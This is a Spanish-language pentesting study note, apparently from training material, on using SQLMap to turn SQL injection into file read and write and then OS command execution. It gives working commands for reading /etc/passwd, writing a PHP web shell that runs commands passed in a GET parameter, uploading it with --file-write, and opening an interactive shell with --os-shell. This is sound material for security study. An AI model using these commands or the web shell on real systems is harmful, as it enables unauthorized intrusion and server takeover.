---
tags:
  - sqlmap
  - webapp
  - RCE
---
## Conceptos Clave (TL;DR)

* SQLMap permite utilizar vulnerabilidades de inyección SQL para leer y escribir archivos en el sistema local fuera del DBMS, y potencialmente lograr ejecución de comandos.

* La lectura de archivos es mucho más común que la escritura, ya que escribir archivos está restringido por defecto en los DBMS modernos debido al riesgo de toma de control del servidor mediante web shells.

* En MySQL, la lectura requiere los privilegios LOAD DATA e INSERT. La escritura mediante la consulta INTO OUTFILE exige deshabilitar la configuración `--secure-file-priv` y contar con acceso de escritura a nivel de sistema de archivos en el directorio destino.

* No siempre es estrictamente necesario tener privilegios de Administrador de Base de Datos (DBA) para leer datos, aunque en motores modernos es cada vez más común y aumenta la probabilidad de éxito.

  

## Herramientas Clave

* **SQLMap**: Automatización de enumeración de privilegios, lectura/escritura de archivos locales en el servidor host y obtención interactiva de shells de sistema operativo a través del vector de inyección SQL.

  

## Metodología Paso a Paso

1. **Verificación de Privilegios:** Comprobar si el usuario actual opera bajo el rol de DBA. Esto indica un alto nivel de acceso y sugiere viabilidad para interactuar con el sistema de archivos local.

2. **Lectura de Archivos Locales:** Si se asumen privilegios suficientes, intentar extraer archivos sensibles del sistema host (como /etc/passwd en Linux) para confirmar la capacidad de lectura.

3. **Escritura de Archivos (Web Shell):** Preparar una web shell básica localmente y utilizar SQLMap para subirla a un directorio accesible del servidor web (webroot) para lograr ejecución de código remoto.

4. **Ejecución de Comandos a través de OS Shell:** Automatizar el proceso de ejecución de comandos indicando a SQLMap que despliegue sus propias funciones u opciones (como xp_cmdshell o shells subidas) para interactuar directamente con el sistema sin requerir la creación manual de la shell.

  
## Cheat Sheet de Comandos

```bash
# Verifica si el usuario actual de la base de datos tiene privilegios de DBA

sqlmap -u "<TARGET_URL>" --is-dba
```

```bash
# Intenta leer un archivo del sistema remoto y lo guarda en el directorio output local de sqlmap

sqlmap -u "<TARGET_URL>" --file-read "<REMOTE_FILE_PATH>"
```

```bash
# Crea una web shell simple en PHP localmente

echo '<?php system($_GET["cmd"]); ?>' > <LOCAL_FILE_NAME>.php
```

```bash
# Escribe el archivo local especificado en la ruta remota indicada del servidor

sqlmap -u "<TARGET_URL>" --file-write "<LOCAL_FILE_NAME>.php" --file-dest "<REMOTE_WEB_ROOT>/<LOCAL_FILE_NAME>.php"
```

```bash
# Interactúa con la web shell subida enviando comandos por el parámetro GET

curl http://<TARGET_DOMAIN>/<LOCAL_FILE_NAME>.php?cmd=<COMMAND>
```

```bash
# Intenta obtener una consola interactiva del sistema operativo de manera automática

sqlmap -u "<TARGET_URL>" --os-shell
```

```bash
# Fuerza una técnica específica de inyección (Ej. E para Error-based) para la obtención de la OS Shell

sqlmap -u "<TARGET_URL>" --os-shell --technique=E
```

  
## "Gotchas" y Troubleshooting

* Si obtienes `current user is DBA: False`, la lectura y escritura de archivos probablemente fallen, pero siempre vale la pena probar la lectura, ya que ciertos usuarios menos privilegiados podrían conservar el permiso por configuraciones deficientes.

* Durante la recuperación de archivos, si existen problemas de volcado de datos continuos, SQLMap sugerirá añadir la flag `--no-cast` o `--hex` como método de estabilización.

* La opción `--os-shell` por defecto puede apoyarse en la técnica UNION. Si la shell interactiva no retorna output de los comandos (`No output`), se debe cancelar la ejecución y forzar otra técnica de inyección que permita salida directa, como Error-based (`--technique=E`).

* Al ejecutar `--os-shell`, SQLMap solicitará identificar el lenguaje de la aplicación web y la ruta del "document root". Se puede seleccionar la opción para que SQLMap pruebe rutas comunes automáticamente.

* Para automatizar la aceptación de prompts por defecto en `--os-shell` (como el lenguaje PHP y localizaciones comunes del webroot), añade la flag `--batch`.